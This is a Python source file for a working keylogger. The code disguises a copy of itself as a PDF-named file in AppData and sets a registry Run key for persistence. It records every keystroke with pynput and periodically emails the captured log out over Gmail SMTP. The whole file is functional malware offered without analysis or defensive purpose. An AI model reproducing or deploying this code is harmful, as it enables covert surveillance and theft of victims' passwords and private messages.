import subprocess
import sys
import pynput.keyboard
import threading
import smtplib
import os
import shutil




class Keyloger:
    def __init__(self, time_interval, email, password):
        self.become_persistent()
        self.email = email
        self.password = password
        self.interval = time_interval
        self.log = "first message you are willing to get after the launch of the keylogger"

    def become_persistent(self):
        evil_file_location = os.environ["appdata"] + "\\Notes_Qos_indexe.pdf"
        if not os.path.exists(evil_file_location):
            shutil.copyfile(sys.executable, evil_file_location)
            subprocess.call('reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Default /t REG_SZ /d "'+ evil_file_location + '"', shell = True)




    #writing the report and sending it over mail
    def append_to_log(self,string):
        self.log = self.log + string

    def process_key_press(self, key):
        try :
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "
        self.append_to_log(current_key)

    def report(self):
        print(self.log)
        self.send_mail(self.email, self.password, '\n\n' + self.log)
        self.log = " "
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def send_mail(self,email, password, message):
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()

    def start(self):
        keyboardListener = pynput.keyboard.Listener(on_press = self.process_key_press)
        with keyboardListener :
            self.report()
            keyboardListener.join()